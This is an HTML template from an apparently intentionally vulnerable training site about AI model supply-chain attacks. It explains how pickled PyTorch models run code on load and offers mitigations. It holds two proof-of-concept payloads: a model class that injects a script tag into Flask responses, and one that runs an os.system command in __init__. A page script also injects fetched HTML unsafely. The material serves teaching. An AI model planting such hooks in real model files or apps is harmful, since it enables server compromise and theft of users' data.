<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supply Chain Vulnerability - Pwnzza Shop</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>

    
    {% include 'navbar.html' %}

    <main class="container">
        <h1>Supply Chain Vulnerability</h1>
        
        <div class="supply-chain-content">
            <details class="description-dropdown">
                <summary class="dropdown-title">Description</summary>
                <div class="dropdown-content">
                    <section class="section-box">
                <h2>The Hidden Risk: AI Models Supply Chain Attacks</h2>
                <p>
                   LLMs come with a complex supply chain that introduces a lot of potential vulnerabilities. One big risk is relying on pre-trained models from public hubs—while convenient, these model binaries might be tampered with or contain hidden backdoors. </p>
                   <p>Even trusted platforms can miss malicious uploads, meaning developers could unknowingly integrate compromised models into their systems. Once a bad model is in place, it can quietly affect performance or leak data without obvious signs. </p>
                   <p>But that’s just one piece of the puzzle. The whole LLM pipeline—from collecting and cleaning data to using third-party libraries and deploying apps—offers entry points for attackers.</p>
                   <p> Poisoned datasets, buggy frameworks, or insecure optimization tools can all introduce problems that ripple downstream. To stay safe, developers need to treat every part of the chain with caution and assume that any component could be a target. Being proactive about verifying sources and testing for vulnerabilities is key to building secure LLM systems.
                    

                </p>
            </section>
                </div>
            </details>
            
            
            <details class="description-dropdown" open>
                <summary class="dropdown-title">Demonstration</summary>
                <div class="dropdown-content">
                    <section class="section-box">
               
                    <div style="display: flex; align-items: flex-start; margin-bottom: 20px;">
                        <div style="flex: 1;">
                            <p> To demonstrate this class of vulnerability, we focus on a common but dangerous scenario involving model file formats in frameworks like PyTorch. </p>
                            <p>Files such as .pt, .pth, or .pkl are often assumed to contain only model weights. However, when a model is saved using torch.save() on the entire object—instead of just the state_dict()—it serializes both the model data and the underlying Python code.</p>
                            <p> If an attacker embeds malicious logic in the __init__ method of a custom class, that code will automatically execute during deserialization with torch.load(). Simply loading the model is enough to trigger the attack, potentially leading to arbitrary system commands, data leaks, or full system compromise—making these files effective Trojan horses.</p>
                        </div>
                        <img style="width: 220px; height: auto; margin-left: 15px; flex-shrink: 0;" src="{{ url_for('static', filename='img/supply chain.png') }}" alt="Supply Chain Attack Diagram" class="demonstration-image">
                    </div>
                <h2>XSS Example</h2>
                <p>Below is an example where a malicious JavaScript payload is embedded in the __init__ method of a custom SentimentModel class. When the model is loaded in a web-based environment, the payload is immediately executed on the client side.</p>
                <p> This could be used to exfiltrate data, manipulate the DOM, or run any arbitrary JavaScript code. The payload here is illustrative—you can replace it with any other JavaScript to simulate different attack scenarios.</p>
                <br><br>
                <div class="demo-section">
                    <div class="demo-code">
                        <h3>Malicious Model Code</h3>
                        <pre class="code-block">
class SentimentModel:
    def __init__(self):
        # Initialize model components
        self.vectorizer = None
        self.model = None
        self.vocab = None
        <span style="color: red;">
        # Malicious JavaScript payload
        self.xss_payload = "&lt;script&gt;alert('XSS Vulnerability!');&lt;/script&gt;"
        </span>
    def __getattribute__(self, name):
        # Intercept attribute access
        attr = object.__getattribute__(self, name)
        
        # If a prediction method is called, inject our payload
        if name in ['predict', 'predict_proba']:
            def wrapper(*args, **kwargs):
                result = attr(*args, **kwargs)
                
                # Try to inject in Flask context
                try:
                    from flask import g, after_this_request
                    
                    g.xss_payload = self.xss_payload
                    
                    @after_this_request
                    def inject_xss(response):
                        if 'text/html' in response.content_type:
                            response.data = response.data.replace(
                                b'&lt;/body&gt;', 
                                f'{self.xss_payload}&lt;/body&gt;'.encode()
                            )
                        return response
                except:
                    pass
                
                return result
            
            return wrapper
        
        return attr</pre>
                    </div>
                    
                    <div class="demo-explanation">
                        <h3>How It Works</h3>
                        <p>This malicious model overrides the <code>__getattribute__</code> method to intercept calls to prediction functions. When these functions are called in a Flask application, it:</p>
                        <ol>
                            <li>Performs normal prediction functionality</li>
                            <li>Hooks into Flask's response system using <code>after_this_request</code></li>
                            <li>Injects JavaScript code into HTML responses before they're returned to users</li>
                            <li>The injected code could steal cookies, redirect users, or perform other malicious actions</li>
                        </ol>
                        
                        <div class="live-demo">
                            <h3>Live Demonstration</h3>
                            <p>Click the button below to load a page that creates an instance of a malicious model. </p>                            
                            <a href="/demo-malicious-model" class="demo-btn" target="_blank">Load Malicious Model Demo</a>
                            <div class="demo-info">
                                <p><i class="fas fa-info-circle"></i> This will open a new page where the model is instantiated, automatically injecting JavaScript into the response.</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <h2>OS Command Execution Example</h2>
                <p>This second example shows how a malicious model can execute operating system commands when loaded:</p>
                
                <div class="demo-section">
                    <div class="demo-code">
                        <h3>OS Attack Model</h3>
                        <pre class="code-block">
import pickle
import torch
import torch.nn as nn
import os

# Define a simple model class (could represent any ML model)
class MaliciousModel(nn.Module):
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.fc1 = nn.Linear(10, 5)
        self.fc2 = nn.Linear(5, 2)

        <span style="color: red;">
        # The following command opens the Calculator in Ubuntu
        self.bash_command = "gnome-calculator &"
        print("Executing Bash command to open Calculator.")
        </span>
        # Execute the Bash command on the server side
        os.system(self.bash_command)

    def forward(self, x):
        x = torch.relu(self.fc1(x))
        x = self.fc2(x)
        return x

# Save the model to a Pickle file
model = MaliciousModel()

# Save the model with the embedded Bash command
with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(model, f)
</pre>
                    </div>
                    
                    <div class="demo-explanation">
                        <h3>How It Works</h3>
                        <p>This malicious model executes operating system commands when instantiated:</p>
                        <ol>
                            <li>The model contains normal neural network layers to appear legitimate</li>
                            <li>Its <code>__init__</code> method contains code that executes a shell command</li>
                            <li>When the model is loaded (either via PyTorch or pickle), the command runs automatically</li>
                            <li>In this example, it launches a calculator app, but it could execute any arbitrary command</li>
                        </ol>
                        
                        <div class="security-note">
                            <h3>Security Risk</h3>
                            <p>This type of attack is particularly dangerous because:</p>
                            <ul>
                                <li>It can execute arbitrary code on the server</li>
                                <li>It could access server files, install malware, or open backdoors</li>
                                <li>Many ML pipelines automatically deserialize models without inspection</li>
                                <li>It exploits the fact that pickle/torch.load are not secure for untrusted data</li>
                            </ul>
                        </div>
                    </div>
                </div>
                </section>
                </div>
                </details>
                 
                    <details class="description-dropdown" >
                     <summary class="dropdown-title">Mitigation Strategies</summary>
                        <div class="dropdown-content">
                         <section class="section-box">
                
                    

                        <p><b>Golden Rule:</b> Treat AI models as potentially untrusted code - always verify, isolate, and test.</p>
                        <h3>Model Selection</h3>
                            <ul>
                                <li><strong>Use trusted sources</strong> (Hugging Face, TensorFlow Hub, official repos)</li>
                                <li><strong>Check uploader reputation</strong> and community feedback</li>
                                <li><strong>Avoid models with poor documentation</strong> - major red flag</li>
                            </ul>

                            <h3>File Format Security</h3>
                            <ul>
                                <li><strong>Prefer SafeTensors</strong> (.safetensors) over pickle (.pkl) files</li>
                                <li><strong>Avoid trust_remote_code=True</strong> unless absolutely necessary</li>
                                <li><strong>Be cautious with .pt files</strong> from untrusted sources</li>
                            </ul>

                            <h3>Technical Protection</h3>
                            <ul>
                                <li><strong>Use TorchScript</strong> for PyTorch models when possible</li>
                                <li><strong>Isolate testing</strong> in VMs/containers</li>
                                <li><strong>Verify file integrity</strong> with checksums</li>
                            </ul>

                            <h3>Operational Security</h3>
                            <ul>
                                <li><strong>Test thoroughly</strong> before production use</li>
                                <li><strong>Monitor model behavior</strong> continuously</li>
                                <li><strong>Protect sensitive data</strong> during fine-tuning</li>
                                <li><strong>Have rollback plans</strong> ready</li>
                            </ul>
                
            </section>
            </div>
            </details>
        </div>
    </main>

    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Get the button element
            const triggerButton = document.getElementById('trigger-model');
            
            // Add click event listener
            triggerButton.addEventListener('click', function() {
                // Show loading message
                document.getElementById('vuln-demo-result').innerHTML = 
                    '<p>Creating an instance of the malicious model...</p>';
                
                // Make a request to load the model
                fetch('/load-malicious-model')
                    .then(response => response.json())
                    .then(data => {
                        // Check if the response contains the JavaScript payload
                        if (data.js_payload) {
                            // Execute the JavaScript by injecting it into the page
                            // In a real supply chain attack, this would happen automatically
                            const scriptContainer = document.createElement('div');
                            scriptContainer.innerHTML = data.js_payload;
                            document.body.appendChild(scriptContainer);
                        }
                    })
                    .catch(error => {
                        console.error('Error loading model:', error);
                        document.getElementById('vuln-demo-result').innerHTML = 
                            '<div class="alert alert-danger">Error loading the model. Check the console for details.</div>';
                    });
            });
        });
    </script>
</body>
</html>